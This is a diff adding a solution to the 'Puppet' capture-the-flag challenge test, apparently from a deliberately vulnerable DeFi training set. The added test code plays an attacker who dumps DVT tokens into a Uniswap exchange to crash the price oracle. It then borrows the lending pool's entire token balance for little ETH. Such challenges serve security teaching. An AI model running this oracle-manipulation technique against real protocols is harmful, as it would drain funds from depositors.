@@ -103,6 +103,14 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // abuse oracle, decrease price of DVT dramatically
+        // borrow full amount that exists in the lending pool
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+        );
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), ethers.utils.parseEther('8'), (await ethers.provider.getBlock('latest')).timestamp * 2);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethers.utils.parseEther('21'), gasLimit: 1e6 });
     });
 
     after(async function () {
